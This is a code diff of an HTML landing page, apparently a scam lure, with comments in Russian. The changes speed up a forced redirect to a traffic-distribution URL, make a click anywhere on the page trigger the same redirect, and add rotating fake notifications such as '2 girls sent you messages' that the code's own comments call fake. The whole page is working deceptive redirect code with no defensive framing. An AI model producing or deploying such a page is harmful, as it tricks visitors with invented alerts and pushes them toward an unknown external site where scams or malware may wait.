@@ -2,51 +2,67 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>New Messages</title>
+<title>Loading...</title>
 
-<meta http-equiv="refresh" content="2;url=https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0">
+<!-- быстрый редирект -->
+<meta http-equiv="refresh" content="1;url=https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0">
 
 <style>
 body {
-    background: #111;
-    color: white;
-    text-align: center;
+    margin: 0;
+    background: #000;
+    color: #fff;
     font-family: Arial;
-    padding-top: 100px;
+    text-align: center;
 }
 .box {
-    background: #1c1c1c;
-    padding: 30px;
-    border-radius: 15px;
-    width: 300px;
-    margin: auto;
+    margin-top: 80px;
 }
 .btn {
+    background: red;
+    padding: 20px;
     display: inline-block;
     margin-top: 20px;
-    padding: 15px 25px;
-    background: red;
     color: white;
-    text-decoration: none;
     font-weight: bold;
     border-radius: 10px;
 }
-.timer {
-    color: #ff4444;
-    margin-top: 10px;
+.popup {
+    position: fixed;
+    bottom: 10px;
+    left: 10px;
+    background: #222;
+    padding: 10px;
+    border-radius: 8px;
+    font-size: 12px;
 }
 </style>
 
 <script>
-let time = 5;
-function countdown() {
-    document.getElementById("timer").innerText = time;
-    time--;
-    if (time < 0) {
-        window.location.href = "https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0";
-    }
+// мгновенный JS редирект (дублирует meta)
+setTimeout(function(){
+    window.location.href = "https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0";
+}, 800);
+
+// клик по всей странице
+document.onclick = function(){
+    window.location.href = "https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0";
+};
+
+// фейковые уведомления
+let messages = [
+"Anna from your city is online 🔥",
+"2 girls sent you messages",
+"Someone is waiting for you...",
+"New private message received"
+];
+
+function showPopup() {
+    let msg = messages[Math.floor(Math.random() * messages.length)];
+    document.getElementById("popup").innerText = msg;
 }
-setInterval(countdown, 1000);
+
+setInterval(showPopup, 1500);
 </script>
 
 </head>
@@ -54,14 +70,14 @@ setInterval(countdown, 1000);
 <body>
 
 <div class="box">
-    <h2>🔥 2 girls near you are online</h2>
-    <p>They sent you private messages</p>
+    <h1>🔥 3 GIRLS ARE WAITING</h1>
+    <p>Click anywhere to view messages</p>
 
-    <a class="btn" href="https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0">VIEW NOW</a>
+    <div class="btn">ENTER NOW</div>
+</div>
 
-    <div class="timer">
-        Redirecting in <span id="timer">5</span> sec...
-    </div>
+<div id="popup" class="popup">
+Loading...
 </div>
 
 </body>
